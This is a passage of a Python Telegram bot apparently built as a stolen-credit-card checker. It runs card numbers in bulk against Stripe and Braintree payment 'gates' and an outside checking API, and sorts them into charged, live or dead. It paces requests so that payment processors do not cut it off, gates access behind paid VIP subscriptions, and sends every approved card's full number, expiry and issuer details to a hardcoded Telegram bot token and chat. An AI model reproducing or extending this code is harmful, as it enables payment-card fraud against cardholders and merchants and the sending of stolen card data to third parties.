                cm5 = types.InlineKeyboardButton(f"• 𝗧𝗢𝗧𝗔𝗟 👻 : [ {total} ] •", callback_data='x')
                cm6 = types.InlineKeyboardButton(" 𝗦𝗧𝗢𝗣 🛑 ", callback_data='stop')
                mes.add(cm1, cm2, cm3, cm4, cm5, cm6)
                bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''𝗪𝗔𝗜𝗧 𝗙𝗢𝗥 𝗣𝗥𝗢𝗖𝗘𝗦𝗦𝗜𝗡𝗚 
𝗕𝗬 ➜ @RAJARAJ909''', reply_markup=mes)
                
                try:
                    last = str(Tele(cc))
                except Exception as e:
                    print(e)
                    try:
                        last = str(Tele(cc))
                    except Exception as e:
                        print(e)
                        last = "𝗬𝗼𝘂𝗿 𝗰𝗮𝗿𝗱 𝘄𝗮𝘀 𝗱𝗲𝗰𝗹𝗶𝗻𝗲𝗱."
                
                msg = f'''𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅
                    
𝗖𝗔𝗥𝗗: {cc}𝗚𝗔𝗧𝗘𝗪𝗔𝗬: 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵
𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: 𝗩𝗕𝗩/𝗖𝗩𝗩.

𝗜𝗡𝗙𝗢: {brand} - {typ} - {dicr}
𝗜𝗦𝗦𝗨𝗘𝗥: {bank}
𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {cn} {emj}

𝗧𝗜𝗠𝗘: 𝟬 𝘀𝗲𝗰𝗼𝗻𝗱𝘀
𝗟𝗘𝗙𝗧 𝗧𝗢 𝗖𝗛𝗘𝗖𝗞: {total - dd - live - ch}
𝗖𝗛𝗘𝗖𝗞𝗘𝗗 𝗕𝗬: @{username}
𝗕𝗢𝗧 𝗕𝗬:  @RAJARAJ909'''
                print(last)
                if "requires_action" in last:
                    send_telegram_notification(msg)
                    bot.reply_to(message, msg)
                    live += 1
                elif "Your card does not support this type of purchase." in last:
                    live += 1
                    send_telegram_notification(msg)
                    bot.reply_to(message, msg)
                elif "Your card's security code is incorrect." in last:
                    live += 1
                    send_telegram_notification(msg)
                    bot.reply_to(message, msg)
                elif "succeeded" in last:
                    ch += 1
                    elapsed_time = time.time() - start_time
                    msg1 = f'''𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅
                    
𝗖𝗔𝗥𝗗: {cc}𝗚𝗔𝗧𝗘𝗪𝗔𝗬: 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵
𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: 𝗖𝗮𝗿𝗱 𝗔𝗱𝗱𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆

𝗜𝗡𝗙𝗢: {brand} - {typ} - {dicr}
𝗜𝗦𝗦𝗨𝗘𝗥: {bank}
𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {cn} {emj}

𝗧𝗜𝗠𝗘: {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀
𝗟𝗘𝗙𝗧 𝗧𝗢 𝗖𝗛𝗘𝗖𝗞: {total - dd - live - ch}
𝗖𝗛𝗘𝗖𝗞𝗘𝗗 𝗕𝗬: @{username}
𝗕𝗢𝗧 𝗕𝗬: @RAJARAJ909'''
                    send_telegram_notification(msg1)
                    bot.reply_to(message, msg1)
                else:
                    dd += 1
                    
                checked_count = ch + live + dd
                if checked_count % 50 == 0:
                    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text="𝗧𝗔𝗞𝗜𝗡𝗚 𝗔 𝟭-𝗠𝗜𝗡𝗨𝗧𝗘 𝗕𝗥𝗘𝗔𝗞... 𝗧𝗢 𝗣𝗥𝗘𝗩𝗘𝗡𝗧 𝗚𝗔𝗧𝗘 𝗙𝗥𝗢𝗠 𝗗𝗬𝗜𝗡𝗚, 𝗣𝗟𝗘𝗔𝗦𝗘 𝗪𝗔𝗜𝗧 ⏳")
                    time.sleep(60)
                    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=f"𝗥𝗘𝗦𝗨𝗠𝗜𝗡𝗚 𝗧𝗛𝗘 𝗣𝗥𝗢𝗖𝗘𝗦𝗦, 𝗦𝗢𝗥𝗥𝗬 𝗙𝗢𝗥 𝗧𝗛𝗘 𝗜𝗡𝗖𝗢𝗡𝗩𝗘𝗡𝗜𝗘𝗡𝗖𝗘")
                    
    except Exception as e:
        print(e)
    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=f'''𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅

𝗔𝘂𝘁𝗵 𝗖𝗖 : {ch}
𝗖𝗖𝗡 : {live}
𝗗𝗲𝗮𝗱 𝗖𝗖 : {dd}
𝗧𝗼𝘁𝗮𝗹 : {total}

𝗕𝗢𝗧 𝗕𝗬 ➜ @RAJARAJ909''')
        
@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
    with open("stop.stop", "w") as file:
        pass
    bot.answer_callback_query(call.id, "𝗕𝗢𝗧 𝗪𝗜𝗟𝗟 𝗦𝗧𝗢𝗣 𝗣𝗥𝗢𝗖𝗘𝗦𝗦𝗜𝗡𝗚 𝗙𝗨𝗥𝗧𝗛𝗘𝗥 𝗧𝗔𝗦𝗞𝗦.")
    bot.send_message(call.message.chat.id, "𝗧𝗛𝗘 𝗕𝗢𝗧 𝗛𝗔𝗦 𝗕𝗘𝗘𝗡 𝗦𝗧𝗢𝗣𝗣𝗘𝗗. 𝗡𝗢 𝗙𝗨𝗥𝗧𝗛𝗘𝗥 𝗧𝗔𝗦𝗞𝗦 𝗪𝗜𝗟𝗟 𝗕𝗘 𝗣𝗥𝗢𝗖𝗘𝗦𝗦𝗘𝗗.")
        
# 𝗦𝗛𝗢𝗪 𝗔𝗨𝗧𝗛 𝗨𝗦𝗘𝗥𝗦
@bot.message_handler(commands=["show_auth_users", "sau", "see_list"])
def show_auth_users(message):
    if str(message.from_user.id) in owners:
        try:
            with open("id.txt", "r") as file:
                allowed_ids = file.readlines()
            if not allowed_ids:
                bot.reply_to(message, "𝗡𝗢 𝗔𝗨𝗧𝗛𝗢𝗥𝗜𝗭𝗘𝗗 𝗨𝗦𝗘𝗥𝗦 𝗙𝗢𝗨𝗡𝗗.")
                return
            
            user_list = "𝗔𝗨𝗧𝗛𝗢𝗥𝗜𝗭𝗘𝗗 𝗨𝗦𝗘𝗥𝗦:\n\n"
            for user_id in allowed_ids:
                user_id = user_id.strip()
                try:
                    user = bot.get_chat(user_id)
                    username = user.username or "𝗡𝗼 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲"
                    user_list += f"• {username} (𝗜𝗗: {user_id})\n"
                except Exception as e:
                    user_list += f"• 𝗨𝘀𝗲𝗿 𝗜𝗗: {user_id} (𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱)\n"
            
            bot.reply_to(message, user_list)
        except FileNotFoundError:
            bot.reply_to(message, "𝗶𝗱.𝘁𝘅𝘁 𝗳𝗶𝗹𝗲 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱. 𝗡𝗼 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘂𝘀𝗲𝗿𝘀.")
    else:
        bot.reply_to(message, "𝗬𝗢𝗨 𝗔𝗥𝗘 𝗡𝗢𝗧 𝗔𝗨𝗧𝗛𝗢𝗥𝗜𝗭𝗘𝗗 𝗧𝗢 𝗩𝗜𝗘𝗪 𝗧𝗛𝗘 𝗟𝗜𝗦𝗧 𝗢𝗙 𝗔𝗨𝗧𝗛𝗢𝗥𝗜𝗭𝗘𝗗 𝗨𝗦𝗘𝗥𝗦.")

# 𝗖𝗛𝗞 𝗖𝗢𝗠𝗠𝗔𝗡𝗗
def is_premium_user(user_id):
    try:
        with open("id.txt", "r") as file:
            lines = file.readlines()
        valid_users = []
        current_time = time.time()
        user_has_access = False
        for line in lines:
            parts = line.strip().split(":")
            if len(parts) != 2:
                continue
            stored_user_id, expire_time = parts
            expire_time = float(expire_time)
            if expire_time > current_time:
                valid_users.append(f"{stored_user_id}:{expire_time}")
                if str(user_id) == stored_user_id:
                    user_has_access = True
        with open("id.txt", "w") as file:
            file.writelines("\n".join(valid_users) + "\n")
        return user_has_access
    except Exception as e:
        print(f"Error checking access: {e}")
        return False

def get_bin_details(bin_number):
    try:
        response = requests.get(f"https://lookup.binlist.net/{bin_number}")
        if response.status_code == 200:
            data = response.json()
            bank = data.get("bank", {}).get("name", "Not Available")
            country = f"{data.get('country', {}).get('name', 'Not Available')} {data.get('country', {}).get('emoji', '')}"
            return bank, country
        return "Not Available", "Not Available"
    except Exception as e:
        print(f"Error fetching BIN details: {e}")
        return "Not Available", "Not Available"

@bot.message_handler(commands=['chk'])
def chk_command(message):
    user_id = message.from_user.id

    if not is_premium_user(user_id):
        bot.reply_to(message, "🚫 𝗩𝗜𝗣 𝗔𝗖𝗖𝗘𝗦𝗦 𝗥𝗘𝗤𝗨𝗜𝗥𝗘𝗗!\n𝗬𝗼𝘂 𝗱𝗼𝗻'𝘁 𝗵𝗮𝘃𝗲 𝗮𝗰𝗰𝗲𝘀𝘀 𝘁𝗼 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱.", parse_mode="HTML")
        return

    args = message.text.split(" ")
    if len(args) != 2:
        bot.reply_to(message, "❌ 𝗨𝗦𝗔𝗚𝗘: /𝗰𝗵𝗸 𝗖𝗖|𝗠𝗠|𝗬𝗬𝗬𝗬|𝗖𝗩𝗩", parse_mode="HTML")
        return

    card_details = args[1]
    match = re.match(r"^(\d{16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})$", card_details)

    if not match:
        bot.reply_to(message, "⚠ 𝗜𝗡𝗩𝗔𝗟𝗜𝗗 𝗙𝗢𝗥𝗠𝗔𝗧! 𝗨𝘀𝗲: /𝗰𝗵𝗸 𝗖𝗖|𝗠𝗠|𝗬𝗬𝗬𝗬|𝗖𝗩𝗩", parse_mode="HTML")
        return

    card_number, month, year, cvv = match.groups()
    bin_number = card_number[:6]
    user = message.from_user.username or "Unknown"
    start_time = time.time()

    if len(year) == 2:
        current_year = datetime.now().year
        century = int(str(current_year)[:2])
        year = str(century) + year  

    bank, country = get_bin_details(bin_number)

    waiting_msg = bot.send_message(message.chat.id, "⏳ 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗖𝗔𝗥𝗗...\n🔴⚪⚪⚪⚪⚪⚪⚪⚪⚪ (𝟬%)", parse_mode="HTML")

    progress_stages = [
        ("🔴🔴⚪⚪⚪⚪⚪⚪⚪⚪ (𝟭𝟬%)", 0.8),
        ("🔴🔴🟠⚪⚪⚪⚪⚪⚪⚪ (𝟮𝟬%)", 0.8),
        ("🔴🔴🟠🟠⚪⚪⚪⚪⚪⚪ (𝟯𝟬%)", 0.8),
        ("🔴🔴🟠🟠🟡⚪⚪⚪⚪⚪ (𝟰𝟬%)", 0.8),
        ("🔴🔴🟠🟠🟡🟡⚪⚪⚪⚪ (𝟱𝟬%)", 0.8),
        ("🔴🔴🟠🟠🟡🟡🔵⚪⚪⚪ (𝟲𝟬%)", 0.8),
        ("🔴🔴🟠🟠🟡🟡🔵🔵⚪⚪ (𝟳𝟬%)", 0.8),
        ("🔴🔴🟠🟠🟡🟡🔵🔵🟢⚪ (𝟴𝟬%)", 0.8),
        ("🔴🔴🟠🟠🟡🟡🔵🔵🟢🟢 (𝟵𝟬%)", 0.8),
        ("🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢 (𝟭𝟬𝟬%)", 0.8),
    ]

    for bar, delay in progress_stages:
        time.sleep(delay)
        bot.edit_message_text(f"⏳ 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗖𝗔𝗥𝗗...\n{bar}", message.chat.id, waiting_msg.message_id, parse_mode="HTML")

    api_url = f"https://darkboyccapi.onrender.com/key=dark/cc={card_number}|{month}|{year}|{cvv}"
    response = requests.get(api_url)

    if response.status_code != 200:
        bot.edit_message_text(f"⚠️ 𝗔𝗣𝗜 𝗘𝗥𝗥𝗢𝗥: {response.text}", message.chat.id, waiting_msg.message_id, parse_mode="HTML")
        return

    data = response.json()
    status = "✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗" if data.get("status") == "Approved" else "❌ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗"
    card_response = html.escape(data.get("response", "No response provided"))
    time_taken = round(time.time() - start_time, 2)

    response_text = f"""
🎩 𝗨𝗟𝗧𝗜𝗠𝗔𝗧𝗘 𝗖𝗔𝗥𝗗 𝗖𝗛𝗘𝗖𝗞 🎩
━━━━━━━━━━━━━━━━━━━━━
💳 𝗖𝗔𝗥𝗗: {card_details}
📌 𝗦𝗧𝗔𝗧𝗨𝗦: {status}
📝 𝗖𝗔𝗥𝗗 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: {card_response}
━━━━━━━━━━━━━━━━━━━━━
🏦 𝗕𝗔𝗡𝗞: {bank}
🌍 𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {country}
⏳ 𝗧𝗜𝗠𝗘 𝗧𝗔𝗞𝗘𝗡: {time_taken} 𝗌𝖾𝖼
👤 𝗖𝗛𝗘𝗖𝗞𝗘𝗗 𝗕𝗬: @{user}
━━━━━━━━━━━━━━━━━━━━━
🔹 𝗘𝗫𝗖𝗟𝗨𝗦𝗜𝗩𝗘 𝗩𝗜𝗣 𝗔𝗖𝗖𝗘𝗦𝗦 ✅
"""

    bot.edit_message_text(response_text, message.chat.id, waiting_msg.message_id, parse_mode="HTML")

# 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗖𝗛𝗘𝗖𝗞𝗘𝗥
import telebot
from braintree_checker import check_braintree

@bot.message_handler(commands=['b3'])
def handle_b3(message):
    try:
        card_details = message.text.split(" ", 1)[1]
        check_braintree(bot, message, card_details)
    except IndexError:
        bot.send_message(message.chat.id, "<b>❌ 𝗘𝗥𝗥𝗢𝗥:</b> 𝗣𝗹𝗲𝗮𝘀𝗲 𝗽𝗿𝗼𝘃𝗶𝗱𝗲 𝗮 𝗰𝗮𝗿𝗱 𝗶𝗻 𝘁𝗵𝗲 𝗳𝗼𝗿𝗺𝗮𝘁 /𝗯𝟯 𝗖𝗖|𝗠𝗠|𝗬𝗬𝗬𝗬|𝗖𝗩𝗩.", parse_mode="HTML")

def send_telegram_notification(msg1):
    url = f"https://api.telegram.org/bot7440283723:AAHs1iPUTL7HHoSVVfESF13lAI8M5jqbZC0/sendMessage"
    data = {'chat_id': -1002374071862, 'text': msg1, 'parse_mode': 'HTML'}
    requests.post(url, data=data)
    
bot.infinity_polling()